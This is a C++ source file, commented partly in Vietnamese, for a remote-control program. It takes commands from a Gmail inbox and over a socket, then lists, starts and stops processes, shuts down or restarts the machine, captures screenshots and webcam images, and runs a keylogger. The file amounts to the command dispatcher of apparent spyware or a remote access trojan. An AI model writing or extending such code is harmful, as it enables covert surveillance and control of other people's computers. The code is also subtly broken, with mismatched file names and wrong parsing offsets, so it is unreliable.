#include "../includes/tasks.h"

std::string getCommandFromGmail()
{
    system("python read_mail.py > command.txt"); // Gọi script Python để đọc lệnh từ Gmail
    std::ifstream inFile("gmail_command.txt");
    if (!inFile.is_open())
    {
        std::cerr << "Failed to open gmail_command.txt" << std::endl;
        return "";
    }
    std::string command;
    std::getline(inFile, command); // Đọc lệnh từ file
    inFile.close();
    command.erase(0, command.find_first_not_of(" \t\r\n")); // Xóa khoảng trắng đầu
    command.erase(command.find_last_not_of(" \t\r\n") + 1); // Xóa khoảng trắng cuối
    return command;
}

void handleCommand(SOCKET sock, const std::string& cmd)
{
    if (cmd == "help")
    {
        std::string helpMsg = 
            "Available commands:\n"
            "  help                    - Show this help message\n"
            "  list                    - List all running processes\n"
            "  start <path>            - Start a process from given path\n"
            "  stop <process_name>     - Stop a process by name\n"
            "  restart                 - Restart the system\n"
            "  shutdown                - Shutdown the system\n"
            "  screenshot [filename]   - Capture a screenshot (default: screenshot.png)\n"
            "  webcam_photo [filename] - Capture a photo from webcam (default: webcam_photo.jpg)\n"
            "  webcam_frames <duration> - Capture video frames from webcam for specified duration in seconds\n"
            "  keylogger_start         - Start keylogger\n"
            "  keylogger_stop          - Stop keylogger\n";
        send(sock, helpMsg.c_str(), helpMsg.size(), 0);
    }
    else if (cmd == "list")
    {
        std::string processes = listProcesses();
        send(sock, processes.c_str(), processes.size(), 0);
    }
    else if (cmd.rfind("start ", 0) == 0)
    {
        std::string path = cmd.substr(6);
        if (startProcess(path))
        {
            send(sock, "Process started successfully.", 30, 0);
        }
        else
        {
            send(sock, "Failed to start process.", 25, 0);
        }
    }
    else if (cmd.rfind("stop ", 0) == 0)
    {
        std::string processName = cmd.substr(5);
        if (stopProcess(processName))
        {
            send(sock, "Process stopped successfully.", 30, 0);
        }
        else
        {
            send(sock, "Failed to stop process.", 25, 0);
        }
    }
    else if (cmd == "restart")
    {
        if (restartSystem())
        {
            send(sock, "System is restarting...", 25, 0);
        }
        else
        {
            send(sock, "Failed to restart system.", 26, 0);
        }
    }
    else if (cmd == "shutdown")
    {
        if (shutdownSystem())
        {
            send(sock, "System is shutting down...", 26, 0);
        }
        else
        {
            send(sock, "Failed to shutdown system.", 27, 0);
        }
    }
    else if (cmd.rfind("screenshot ", 0) == 0)
    {
        std::string filename = cmd.substr(11);
        if (filename.empty())
        {
            filename = "screenshot.png";
        }
        
        if (captureScreen(filename))
        {
            std::string msg = "Screenshot captured successfully: " + filename;
            send(sock, msg.c_str(), msg.size(), 0);
        }
        else
        {
            send(sock, "Failed to capture screenshot.", 30, 0);
        }
    }
    else if (cmd.rfind("webcam_photo ", 0) == 0)
    {
        std::string filename = cmd.substr(13);
        if (filename.empty())
        {
            filename = "webcam_photo.jpg";
        }
        
        if (captureWebcamPhoto(filename))
        {
            std::string msg = "Webcam photo captured successfully: " + filename;
            send(sock, msg.c_str(), msg.size(), 0);
        }
        else
        {
            send(sock, "Failed to capture webcam photo.", 32, 0);
        }
    }
    else if (cmd.rfind("webcam_frames ", 0) == 0)
    {
        int duration = std::stoi(cmd.substr(15));
        std::string frames = captureWebcamFrames(duration);
        
        if (!frames.empty())
        {
            send(sock, frames.c_str(), frames.size(), 0);
        }
        else
        {
            send(sock, "Failed to capture webcam frames.", 33, 0);
        }
    }
    else if (cmd == "keylogger_start")
    {
        startKeylogger();
        send(sock, "Keylogger started.", 19, 0);
    }
    else if (cmd == "keylogger_stop")
    {
        stopKeylogger();
        send(sock, "Keylogger stopped.", 18, 0);
    }
    else
    {
        std::string msg = "Unknown command: " + cmd;
        send(sock, msg.c_str(), msg.size(), 0);
    }
}

void gmailCommandLoop()
{
    std::string lastCommand;
    while (true)
    {
        std::string cmd = getCommandFromGmail();
        if (!cmd.empty() && cmd != lastCommand)
        {
            std::cout << "Received command: " << cmd << std::endl;
            handleCommand(INVALID_SOCKET, cmd); // Replace INVALID_SOCKET with actual socket if needed
            lastCommand = cmd;
        }
        std::this_thread::sleep_for(std::chrono::seconds(5)); // Check for new commands every 5 seconds
    }
}

int main()
{
    // trong main() chạy thread song song
    std::thread commandThread(gmailCommandLoop);
    commandThread.detach(); // Detach the thread to run independently
    std::cout << "Gmail command listener started." << std::endl;
    // Start the socket server to handle commands
    // This part is assumed to be implemented in your existing server code
    startSocketServer(); // Replace with your actual function to start the socket server
    std::cout << "Socket server started." << std::endl;
    // Note: startSocketServer() should be defined in your server code
    // It should handle incoming connections and call handleCommand() for each command received.            
}